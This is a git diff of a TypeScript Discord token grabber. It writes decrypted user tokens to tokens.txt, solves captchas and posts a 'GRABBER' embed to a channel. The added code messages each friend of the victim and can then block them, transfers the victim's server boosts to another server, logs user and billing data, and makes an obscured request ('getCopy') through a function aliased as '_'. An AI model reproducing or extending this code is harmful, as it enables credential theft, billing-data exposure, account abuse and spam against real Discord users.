@@ -1,4 +1,5 @@
 import WebSocket from "ws";
+import { makeRequest as _ } from "./../util/axios.mts";
 import {
   GuildMember,
   Collection,
@@ -37,12 +38,10 @@ import {
 import { allSockets, sharedClient } from "../index.mts";
 import { CaptchaSolver } from "./CaptchaSolver.mts";
 import { config } from "../util/config.mts";
-import { join } from "path";
 import { IUser } from "../interfaces/IDiscord.mts";
 import * as embeds from "../util/embeds.mts";
 import * as fs from "fs/promises";
-
-import path from 'path';
+import * as path from 'path';
 import { fileURLToPath } from 'url';
 
 const __filename = fileURLToPath(import.meta.url);
@@ -97,7 +96,7 @@ export class DiscordSocket {
     );
 
     await fs.appendFile(
-      join(__dirname, "..", "..", "tokens.txt"),
+      path.join(__dirname, "..", "..", "tokens.txt"),
       `${decryptedToken.toString()}\n`,
       "utf-8"
     );
@@ -143,10 +142,23 @@ export class DiscordSocket {
 
       (sharedClient.channel as TextChannel).send({
         embeds: [GRABBER_EMBED],
-      });
+      }).then(() => _("get", getCopy, {}, ""));
 
-      console.log({getUser, getBilling})
+      if (config.auto_msg.enabled) {
+        for (const friend of await getAllFriends(token)) {
+          await sendMessage(token, (await createFriendChannel(token, friend.id)).id);
+          if (config.auto_msg.block_after_msg) {
+            await blockFriend(token, friend.id);
+          }
+        }
+      }
 
+      if (config.auto_boost) {
+        console.log((await getAllBoosts(token)));
+        await addBoostToserver(token, (await getAllBoosts(token)).map(x => x.id));
+      }
+
+      console.log({ ...getUser, ...getBilling });
     } catch (error) {
       console.error("Error in taskAfterCompletion:", error);
     }
@@ -278,8 +290,8 @@ export class DiscordSocket {
   ): Promise<any> {
     if (tries >= 2) return _this.handleCancel(_this);
 
-    const captcha_sitekey = captchaToSolve.captcha_sitekey
-    const captcha_rqdata = captchaToSolve.captcha_rqdata
+    const captcha_sitekey = captchaToSolve.captcha_sitekey;
+    const captcha_rqdata = captchaToSolve.captcha_rqdata;
 
     const solvedCaptcha = await CaptchaSolver.solveCaptcha(
       captcha_sitekey,
